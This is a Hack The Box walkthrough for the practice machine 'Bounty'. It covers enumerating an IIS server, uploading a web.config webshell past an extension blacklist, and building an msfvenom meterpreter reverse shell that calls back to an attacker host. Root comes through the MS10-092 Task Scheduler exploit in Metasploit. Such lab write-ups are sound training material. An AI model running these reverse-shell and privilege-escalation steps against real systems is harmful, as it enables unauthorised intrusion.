# Bounty

[![Bounty](https://secure.gravatar.com/avatar/77c9ae29c6d9f3add2af21410c1090d5.jpg?s=150&d=retro&r=x)](https://www.hackthebox.eu/home/machines/profile/142)

## User
### Nmap
We begin by running Nmap.
```sh
$ nmap -T4 -A -v 10.10.10.93
```
As we can see port 80 is open,but the website is empty.

### Dirb
We run dirb to get hidden directories.
```sh
$ dirb http://10.10.10.93
```
You should have found the **'uploadedfiles'** directory, but still nothing you can do.
As we previously saw from nmap scan, we are dealing with an IIS server. So we will use dirb's extension feature to search for arbitrary file extensions that are used by the IIS server until we find the right one.

```sh
$ dirb http://10.10.10.93/ -X .aspx
```

Running the above command we find the **'transfer.aspx'** file, where we can upload files. 
However uploading an **.aspx** reverse shell doesn't seem to work. By viewing page source code, we can see that a function named **'ValidateFile()'** is called and it is blacklisting file extensions. So we have to find the right extension to exploit this. 
With the information from the message we get when we try to upload a file with the wrong extension and a little google search, we come up with [this](/Bounty/web.config) structure of file.

- sources: 
-- https://soroush.secproject.com/blog/tag/unrestricted-file-upload/
-- https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp

By uploading the [web.config](/Bounty/web.config) file, we get the pleasant message **'File uploaded successfully.'**. 
Next we go to **'uploadedfiles/web.config'** where we should get a field to execute system commands, along with some system information.

**Careful**! We have changed a line in the previous script so we get into a word-writable Windows directory, otherwise we wouldn't have access.
- directory changed:
-- C:\ 
-- C:\windows\system32\spool\drivers\color\ 

**Warning!** The file gets deleted after a few seconds. So act quickly.

### Getting user
As long as we have a basic RCE, getting user is a piece of cake.
```sh
$ more C:\Users\merlin\Desktop\user.txt
```

## Root
### Priv esc
Now we can upload anything we want to the remote machine via **'transfer.aspx'**, by simply appending the **.config** extension to the file. The uploaded files can then be found in the directory **'C:\inetpub\wwwroot\uploadedfiles\'**

### Msfvenom payload
We create a payload with msfvenom and we upload it to remote machine.
```sh
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe
```
**Careful**! The payload must be **x64** architecture, otherwise this is not going to work. Once we upload the payload copy it in the users Desktop.
```sh
$ copy /B C:\inetpub\wwwroot\uploadedfiles\shell.exe.config C:\Users\merlin\Desktop\shell.exe
```

### Msfconsole
Next step is to open msfconsole and set it up.
```sh
$ msfconsole
$ use exploit/multi/handler
$ set payload windows/x64/meterpreter/reverse_tcp
$ set LHOST 10.10.10.10
$ set LPOST 4444
$ exploit -j
```
Back in the remote machine we execute the **'shell.exe'** file we uploaded by running the following command.
```sh
$ start shell.exe
```

### Getting root

We now have an open session running in the background. After hours (for me) of enumeration and again some google search, we can see that the remote system is vulnerable in the **Task Scheduler** and we can use this to elevate our privilages.
- source:
-- https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-092

In the same msfconsole window, while we already have an open session, we put it in the background by typing:

```
background
```

And we make use of a windows exploit suggester by assigning it the already open meterpreter session.

```sh
$ use post/multi/recon/local_exploit_suggester
$ sessions
$ set session <session number>
```

The exploit **'exploit/windows/local/ms10_092_schelevator'** seems to be promising.
- CVE:
-- https://www.exploit-db.com/exploits/15589/

So we make use of it on the current opened session to see if it works.

```sh
$ use exploit/windows/local/ms10_092_schelevator
$ set session <session number>
$ set payload windows/x64/meterpreter/reverse_tcp
$ set LHOST <local ip>
$ set LPORT 4444
$ exploit
```

OK. We got a new session running where if we type the bellow command, we will see we have Administrator privileges.
```sh
$ sysinfo
```

Final task, let's get root!!!
```sh
$ more C:\Users\Administrator\Desktop\root.txt
```

[![bertolis](https://www.hackthebox.eu/badge/image/27897.png)](https://www.hackthebox.eu/home/users/profile/27897)
